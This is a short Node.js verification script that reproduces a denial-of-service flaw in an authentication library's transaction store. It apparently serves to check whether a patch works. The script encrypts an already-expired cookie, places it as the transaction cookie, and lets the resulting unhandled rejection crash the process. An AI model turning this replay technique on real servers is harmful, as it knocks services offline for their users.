import { RequestCookies } from '@edge-runtime/cookies';
import { TransactionStore } from './src/server/transaction-store.js';
import { encrypt } from './src/server/cookies.js';

// This script is designed to crash if the vulnerability is present.
// An unhandled promise rejection will terminate the Node.js process.

const getStore = () => new TransactionStore({ secret: 'a-super-secret-key-that-is-long-enough' });

async function verify() {
  console.log('--- Starting verification for TransactionStore DoS ---');
  const store = getStore();
  const reqCookies = new RequestCookies(new Headers());
  const state = 'some-random-state-value';
  const transactionCookieName = `__txn_${state}`;

  console.log('Step 1: Creating a fake, expired cookie value...');
  // We simulate an expired cookie being replayed.
  const expiredPayload = { user: 'test' };
  // Set expiration to 1 hour in the past.
  const expirationTime = Math.floor(Date.now() / 1000) - 3600;
  const expiredCookieValue = await encrypt(expiredPayload, 'a-super-secret-key-that-is-long-enough', expirationTime);
  console.log('Expired cookie value created.');

  console.log('Step 2: Simulating attack: placing the expired cookie where the transaction cookie should be...');
  reqCookies.set(transactionCookieName, expiredCookieValue);
  console.log('Attack cookies prepared.');

  console.log('Step 3: Calling store.get()... If vulnerable, this will cause an unhandled rejection and crash the process.');

  // We are NOT catching the error here. An unhandled rejection is the vulnerability.
  await store.get(reqCookies, state);

  // If the script reaches this line, the vulnerability is NOT present.
  console.log('--- VERIFICATION FAILED: The process did not crash. The vulnerability may be patched. ---');
}

verify();
